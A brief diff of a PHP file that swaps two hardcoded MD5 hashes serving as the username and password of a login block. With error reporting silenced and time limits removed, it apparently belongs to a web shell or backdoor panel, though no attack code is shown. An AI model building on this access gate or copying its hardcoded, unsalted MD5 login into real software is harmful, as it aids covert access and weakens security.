@@ -4,8 +4,8 @@ error_reporting(0);
 set_time_limit(0);
 
 // --- LOGIN SYSTEM (MD5 UPDATED) ---
-$user = "97c664bbefca68f6c78456ea82db367d"; // 
-$pass = "137bfd55cdde4b1a830f97759c1acb28"; // 
+$user = "dc571867053d4f69c37666db0144d898"; // 
+$pass = "766472e48ad875c81776ceddb5806425"; // 
 
 if (isset($_POST['login'])) { 
     if (md5($_POST['u']) == $user && md5($_POST['p']) == $pass) {
